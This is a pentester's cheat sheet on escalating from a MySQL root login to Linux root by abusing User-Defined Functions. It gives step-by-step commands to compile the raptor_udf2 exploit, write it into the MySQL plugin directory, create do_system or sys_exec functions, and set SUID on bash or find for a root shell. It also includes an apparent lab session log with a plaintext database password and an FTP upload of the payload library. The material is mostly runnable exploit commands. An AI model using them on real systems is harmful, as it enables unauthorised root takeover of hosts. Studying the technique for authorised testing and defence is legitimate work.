## User Defined Function PrivEsc
```
MySQL User-Defined-Functions (UDF)
Mysql UDF privilege escalation.

    https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf
    https://steflan-security.com/linux-privilege-escalation-exploiting-user-defined-functions/

If you get the below error, simply replace /usr/lib/mysql/plugin/raptor_udf2.so with the raptor_udf2.so file you created originally.

mysql> create function do_system returns integer soname ’raptor_udf2.so’ ;
ERROR 1126 (HY000) : Can’t open shared library ’raptor_udf2.so’ (errno : 0 /usr/lib/mysql/plugin/raptor_udf2.so : file too short)

If you cannot execute commands interactively, exec interactively by:
    mysql -u root -p[password] mysql -e "[mysql_command]"


Restart services:
# systemctl restart daemon
# service daemon restart

systemctl list-dependencies , Show Services
systemctl start servicename , Start Service
systemctl enable servicename , Start service with system
systemctl status servicename , Show Service Status

command systemctl --no-page --no-legend --plain -t service --state=running , Show running services


The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:
cd /home/user/tools/mysql-udf

Check if lib_mysqludf_sys.so is installed on the box:
$ whereis lib_mysqludf_sys.so

Compile the raptor_udf2.c exploit code using the following commands:

gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

Connect to the MySQL service as the root user with a blank password:

mysql -u root

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

/tmp/rootbash -p
```

## UDF 2
```
www-data@mute:/tmp$ mysql -u root -p
Enter password: peterRivierasick

# location where mysql expects its udf to be stored.
mysql> SHOW VARIABLES LIKE 'plugin_dir';
+---------------+------------------------+
| Variable_name | Value                  |
+---------------+------------------------+
| plugin_dir    | /usr/lib/mysql/plugin/ |
+---------------+------------------------+
1 row in set (0.00 sec)

# checking if database has been misconfigured to allow insecure handling of files.
mysql> SHOW VARIABLES LIKE "secure_file_priv";
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
1 row in set (0.00 sec)

https://github.sofianehamlaoui.fr/Security-Cheatsheets/databases/mysql/mysql-root-to-system-root/
https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql
Using https://gist.github.com/p0c/8587757
[OR] https://www.exploit-db.com/exploits/1518

# using ftp to upload
ftp> put lib_mysqludf_sys_64.so
local: lib_mysqludf_sys_64.so remote: lib_mysqludf_sys_64.so
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
8040 bytes sent in 0.00 secs (207.2308 MB/s)

ftp> chmod 777 lib_mysqludf_sys_64.so
200 SITE CHMOD command ok.

ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
[truncated]
-rwxrwxrwx    1 1001     1001         8040 Aug 30 16:49 lib_mysqludf_sys_64.so
226 Directory send OK.

# connect to mysql
use mysql;
create table mute(line blob);
insert into mute values(load_file('/var/www/html/lib_mysqludf_sys_64.so'));
select * from mute into dumpfile '/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so';
create function sys_exec returns integer soname 'lib_mysqludf_sys_64.so';
select sys_exec('chmod +s /usr/bin/find');

www-data@mute:/var/www/html$ ls -la /usr/bin/find
-rwsr-sr-x 1 root root 221768 Feb 18  2017 /usr/bin/find
```
